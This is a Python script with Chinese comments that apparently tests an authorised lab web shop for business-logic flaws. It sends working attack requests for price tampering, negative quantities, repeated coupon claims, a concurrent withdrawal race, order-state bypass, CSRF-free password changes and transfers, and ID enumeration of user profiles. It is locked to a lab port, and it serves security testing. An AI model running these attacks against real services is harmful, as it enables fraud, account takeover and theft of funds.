"""② 通用业务逻辑验证器 —— 「读状态 → 动作 → 再读状态 → 对比」。

覆盖只读工具无法验证的类：
  G1 金额篡改   G2 负数/超大数量   G3 优惠券重复领取（幂等性）
  G4 并发竞态(TOCTOU)   G5 状态机绕过   A2/A3 无 CSRF 的敏感写操作

判据全部落到**可观测的状态变化**（余额、订单状态），不再只看 HTTP 200。
参数名优先用 param_discover.py 产出的 surface.json，缺失时回退默认值。

仅用于授权靶场（默认只允许 8095）。用法: python logic_verify.py [base]
"""
import http.cookiejar
import json
import pathlib
import re
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

from guard import assert_target_allowed

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:  # noqa: BLE001
    pass

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8095").rstrip("/")
assert_target_allowed(BASE)
PORT = urllib.parse.urlparse(BASE).port
if PORT != 8095:
    print(f"⛔ 该工具会执行写操作，只允许靶场端口 8095（当前 {PORT}）")
    sys.exit(2)
UA = "DSH-LogicVerify/0.1 (lab-only)"
HERE = pathlib.Path(__file__).resolve().parent
FINDINGS = []


class Cli:
    def __init__(self):
        self.op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))

    def r(self, path, data=None, headers=None, timeout=20):
        url = BASE + path
        assert_target_allowed(url)
        body = urllib.parse.urlencode(data).encode() if isinstance(data, dict) else data
        h = {"User-Agent": UA}
        if isinstance(data, dict):
            h["Content-Type"] = "application/x-www-form-urlencoded"
        h.update(headers or {})
        try:
            with self.op.open(urllib.request.Request(url, data=body, headers=h), timeout=timeout) as resp:
                return resp.status, resp.read(200_000).decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read(200_000).decode("utf-8", "replace")
        except Exception as e:  # noqa: BLE001
            return None, str(e)


def login(user, pwd):
    c = Cli()
    c.r("/login")
    c.r("/login", {"username": user, "password": pwd})
    return c


me = login("demo", "demo123")

# --- 找自己的 user id ---
my_id = None
for i in range(1, 8):
    s, b = me.r(f"/api/profile?id={i}")
    if s == 200 and '"username": "demo"' in b:
        my_id = i
        break
print(f"=== 业务逻辑验证 {BASE} ===\n[准备] demo 的 id={my_id}")


def balance():
    if my_id is None:
        return None
    _, b = me.r(f"/api/profile?id={my_id}")
    m = re.search(r'"balance_cents"\s*:\s*(-?\d+)', b or "")
    return int(m.group(1)) if m else None


def order_state(oid):
    _, b = me.r(f"/api/order?id={oid}")
    m = re.search(r'"state"\s*:\s*"([^"]+)"', b or "")
    return m.group(1) if m else None


def add(vid, name, hit, ev):
    FINDINGS.append({"id": vid, "name": name, "hit": bool(hit), "evidence": ev[:200]})
    print(f"  {'🎯 命中' if hit else '·  未见'} [{vid}] {name} —— {ev[:110]}")


# 读 surface.json（参数名尽量来自发现，而非猜测）
surface = {}
sp = HERE / "surface.json"
if sp.exists():
    surface = json.loads(sp.read_text(encoding="utf-8"))
    print(f"  已载入 surface.json（{len(surface.get('endpoints', {}))} 个端点）")

print("\n[G1] 金额篡改（客户端定价）")
b0 = balance()
me.r("/order/create", {"product_id": "1", "qty": "1", "price": "1"})
time.sleep(0.4)
b1 = balance()
# 原价 29900；若只扣 1 分，说明服务端采信了客户端价格
delta1 = (b0 - b1) if (b0 is not None and b1 is not None) else None
add("G1", "金额篡改（服务器采信客户端 price）",
    delta1 is not None and 0 < delta1 <= 100,
    f"余额 {b0}→{b1}（扣 {delta1} 分；商品原价 29900，说明按客户端 price=1 计价）")

print("\n[G2] 负数数量")
b0 = balance()
me.r("/order/create", {"product_id": "1", "qty": "-100", "price": "100"})
time.sleep(0.4)
b1 = balance()
delta2 = (b1 - b0) if (b0 is not None and b1 is not None) else None
add("G2", "负数数量导致余额反向增加",
    delta2 is not None and delta2 > 0,
    f"余额 {b0}→{b1}（变化 {delta2} 分；qty=-100 时 price*qty 为负 → 应扣款变加钱）")

print("\n[G3] 优惠券重复领取（幂等性）")
before = balance()
me.r("/coupon/claim?code=WELCOME10")
time.sleep(0.3)
mid = balance()
me.r("/coupon/claim?code=WELCOME10")
time.sleep(0.3)
after = balance()
twice = all(x is not None for x in (before, mid, after))
add("G3", "同一优惠券可重复领取",
    twice and (mid - before) > 0 and (after - mid) > 0,
    f"两次领取余额变化：{before}→{mid}→{after}（每次都增加即无幂等校验）")

print("\n[G4] 提现并发竞态（TOCTOU）")
rac = login("alice", "alice123")
aid = None
for i in range(1, 8):
    s, b = rac.r(f"/api/profile?id={i}")
    if s == 200 and '"username": "alice"' in b:
        aid = i
        break


def rbalance(c, uid):
    _, b = c.r(f"/api/profile?id={uid}")
    m = re.search(r'"balance_cents"\s*:\s*(-?\d+)', b or "")
    return int(m.group(1)) if m else None


rb0 = rbalance(rac, aid)
amt = max(1, (rb0 or 1000))          # 每次提现全额
codes = []
lock = threading.Lock()


def worker():
    c = login("alice", "alice123")
    st, _ = c.r("/wallet/withdraw", {"amount": str(amt)})
    with lock:
        codes.append(st)


ts = [threading.Thread(target=worker) for _ in range(8)]
[t.start() for t in ts]
[t.join() for t in ts]
time.sleep(0.5)
rb1 = rbalance(rac, aid)
succ = len([c for c in codes if c in (200, 302)])
overdraw = (rb1 is not None and rb1 < 0) or (succ > 1 and rb0 is not None and succ * amt > rb0)
add("G4", "并发竞态导致超额扣款/余额为负",
    overdraw,
    f"alice 余额 {rb0}→{rb1}；8 个并发各提现 {amt}，成功 {succ} 次（成功总额 {succ*amt}）")

print("\n[G5] 订单状态机绕过（跳过支付）")
st_before = order_state(2)
me.r("/order/status?order_id=2&state=shipped")
time.sleep(0.4)
st_after = order_state(2)
add("G5", "订单状态可被直接改写（跳过支付）",
    st_before is not None and st_after is not None and st_before != st_after,
    f"订单 2 状态 {st_before!r} → {st_after!r}")

print("\n[A2/A3] 无 CSRF token 的敏感写操作")
# A2 改密（用一次性目标账号 demo，改完可由 __reset 恢复）
nc = login("bob", "bob123")          # 用 bob 做实验，避免动 demo
nc.r("/change-password", {"new_password": "dsh_new_pw_1"})
lc = Cli()
lc.r("/login")
lc.r("/login", {"username": "bob", "password": "dsh_new_pw_1"})
s, b = lc.r("/home")
add("A2", "改密接口无 CSRF token（可不带 token 改掉他人密码）",
    s == 200 and "bob" in (b or ""),
    "不带任何 CSRF 字段调用 /change-password 后，用新密码成功登录")

# A3 转账无 CSRF
t = login("alice", "alice123")
aid2 = None
for i in range(1, 8):
    s, b = t.r(f"/api/profile?id={i}")
    if s == 200 and '"username": "alice"' in b:
        aid2 = i
bid = None
for i in range(1, 8):
    s, b = t.r(f"/api/profile?id={i}")
    if s == 200 and '"username": "bob"' in b:
        bid = i
bb0 = rbalance(t, bid)
t.r("/wallet/transfer", {"to": "bob", "amount": "666"})
time.sleep(0.4)
bb1 = rbalance(t, bid)
add("A3", "转账接口无 CSRF token",
    bb0 is not None and bb1 is not None and bb1 > bb0,
    f"不带 CSRF 字段转账 666 → bob 余额 {bb0}→{bb1}")

print("\n=== 汇总 ===")
hits = [f for f in FINDINGS if f["hit"]]
print(f"  检查 {len(FINDINGS)} 项，命中 {len(hits)} 项：" + ", ".join(f["id"] for f in hits))
(HERE / "logic_findings.json").write_text(json.dumps(FINDINGS, ensure_ascii=False, indent=1), encoding="utf-8")
print(f"  已存: logic_findings.json")
